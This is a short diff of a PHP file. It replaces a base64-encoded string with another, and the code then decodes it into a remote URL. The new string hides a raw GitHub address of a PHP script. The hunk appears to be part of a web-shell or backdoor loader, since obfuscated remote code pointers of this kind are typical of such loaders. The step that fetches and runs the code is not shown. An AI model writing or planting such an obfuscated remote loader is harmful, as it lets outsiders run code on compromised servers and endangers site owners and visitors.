@@ -1,5 +1,5 @@
 <?php
-$encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RyeXhhcHAvZXhjb24vcmVmcy9oZWFkcy9tYWluL25ld2NvbjEvbmV3Y29uMi9vbmNvbi8yLnBodG1s";
+$encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RyeXhhcHAvZXhjb24vcmVmcy9oZWFkcy9tYWluL25ld2NvbjEvbmV3Y29uMi9vbmNvbi9zaG9ydC90cnl4bDFsLnBocA==";
 
 $remote_url = base64_decode($encoded_url);
 
